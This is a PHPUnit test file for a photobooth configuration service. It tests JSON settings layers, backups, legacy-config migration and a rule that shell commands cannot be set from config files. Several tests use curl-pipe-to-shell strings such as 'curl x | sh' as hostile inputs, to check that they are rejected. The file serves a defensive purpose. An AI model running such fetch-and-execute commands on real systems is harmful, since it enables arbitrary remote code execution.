<?php

declare(strict_types=1);

namespace Photobooth\Tests\Unit\Service;

use Photobooth\Service\ConfigurationService;
use PHPUnit\Framework\TestCase;

final class ConfigurationServiceTest extends TestCase
{
    private string $directory;

    protected function setUp(): void
    {
        $this->directory = sys_get_temp_dir() . '/snaphora-config-test-' . bin2hex(random_bytes(4));
        mkdir($this->directory . '/layers', 0777, true);
    }

    protected function tearDown(): void
    {
        exec('rm -rf ' . escapeshellarg($this->directory));
        putenv('SNAPHORA_COMMAND_PRINT');
    }

    private function boxFile(): string
    {
        return $this->directory . '/layers/box.json';
    }

    private function write(string $file, string $content): void
    {
        file_put_contents($this->directory . '/' . $file, $content);
        if (function_exists('opcache_invalidate')) {
            opcache_invalidate($this->directory . '/' . $file, true);
        }
    }

    public function testWithoutBoxSettingsDefaultsAreUsed(): void
    {
        $service = new ConfigurationService($this->directory);

        $this->assertSame(
            $service->getDefaultConfiguration()['print']['limit'],
            $service->getConfiguration()['print']['limit'],
        );
    }

    public function testSaveWritesJsonLayerAndKeepsBackupOfPreviousVersion(): void
    {
        $service = new ConfigurationService($this->directory);
        $config = $service->getConfiguration();

        $config['print']['limit'] = 200;
        $service->update($config);
        $config['print']['limit'] = 400;
        $service->update($config);

        $this->assertSame(400, (new ConfigurationService($this->directory))->getConfiguration()['print']['limit']);
        $this->assertSame(400, json_decode((string) file_get_contents($this->boxFile()), true)['config']['print']['limit']);
        $this->assertSame(200, json_decode((string) file_get_contents($this->boxFile() . '.bak'), true)['config']['print']['limit']);
    }

    /**
     * @return array<string, array{string}>
     */
    public static function damagedLayerProvider(): array
    {
        return [
            'empty file' => [''],
            'cut off in the middle' => ['{"config": {"print": {"lim'],
            'no config' => ['{"print": 1}'],
        ];
    }

    #[\PHPUnit\Framework\Attributes\DataProvider('damagedLayerProvider')]
    public function testDamagedBoxSettingsFallBackToBackup(string $damagedContent): void
    {
        $this->write('layers/box.json.bak', '{"config": {"print": {"limit": 200}}}');
        $this->write('layers/box.json', $damagedContent);

        $this->assertSame(200, (new ConfigurationService($this->directory))->getConfiguration()['print']['limit']);
    }

    public function testDamagedBoxSettingsDoNotOverwriteGoodBackup(): void
    {
        $this->write('layers/box.json.bak', '{"config": {"print": {"limit": 200}}}');
        $this->write('layers/box.json', '');

        $service = new ConfigurationService($this->directory);
        $config = $service->getConfiguration();
        $config['print']['limit'] = 400;
        $service->update($config);

        $this->assertSame(200, json_decode((string) file_get_contents($this->boxFile() . '.bak'), true)['config']['print']['limit']);
    }

    public function testLegacyConfigurationIsMigratedOnceWithoutShellCommands(): void
    {
        $this->write('my.config.inc.php', "<?php\n\nreturn ['print' => ['limit' => 300], 'commands' => ['print' => 'curl x | sh']];\n");

        $service = new ConfigurationService($this->directory);

        $this->assertSame(300, $service->getConfiguration()['print']['limit']);
        $this->assertSame($service->getDefaultConfiguration()['commands']['print'], $service->getConfiguration()['commands']['print']);
        $layer = json_decode((string) file_get_contents($this->boxFile()), true);
        $this->assertSame(['print' => ['limit' => 300]], $layer['config']);
        $this->assertSame('my.config.inc.php', $layer['migratedFrom']);
        $this->assertFileDoesNotExist($this->directory . '/my.config.inc.php');
        $this->assertFileExists($this->directory . '/my.config.inc.php.migrated');
    }

    public function testDamagedLegacyConfigurationIsMigratedFromItsBackup(): void
    {
        $this->write('my.config.inc.php', "<?php\n\nreturn [");
        $this->write('my.config.inc.php.bak', "<?php\n\nreturn ['print' => ['limit' => 200]];\n");

        $this->assertSame(200, (new ConfigurationService($this->directory))->getConfiguration()['print']['limit']);
    }

    public function testShellCommandsCannotBeSetByAnyLayerOrSaved(): void
    {
        file_put_contents($this->boxFile(), '{"config": {"commands": {"print": "curl x | sh"}}}');
        file_put_contents($this->directory . '/layers/device.json', '{"config": {"commands": {"take_picture": "curl y | sh"}}}');
        $service = new ConfigurationService($this->directory);
        $defaults = $service->getDefaultConfiguration()['commands'];

        $this->assertSame($defaults['print'], $service->getConfiguration()['commands']['print']);
        $this->assertSame($defaults['take_picture'], $service->getConfiguration()['commands']['take_picture']);

        $config = $service->getConfiguration();
        $config['commands']['print'] = 'curl z | sh';
        $service->update($config);
        $this->assertStringNotContainsString('curl', (string) file_get_contents($this->boxFile()));
    }

    public function testCommandsComeFromTheProvisioning(): void
    {
        putenv('SNAPHORA_COMMAND_PRINT=lp -d DNP_DS620 %s');

        $this->assertSame('lp -d DNP_DS620 %s', (new ConfigurationService($this->directory))->getConfiguration()['commands']['print']);
    }

    public function testResetRemovesBoxSettingsAndBackup(): void
    {
        $service = new ConfigurationService($this->directory);
        $config = $service->getConfiguration();
        $config['print']['limit'] = 200;
        $service->update($config);
        $service->update($config);
        $service->reset();

        $this->assertFileDoesNotExist($this->boxFile());
        $this->assertFileDoesNotExist($this->boxFile() . '.bak');
        $this->assertSame(0, (new ConfigurationService($this->directory))->getConfiguration()['print']['limit']);
    }
}
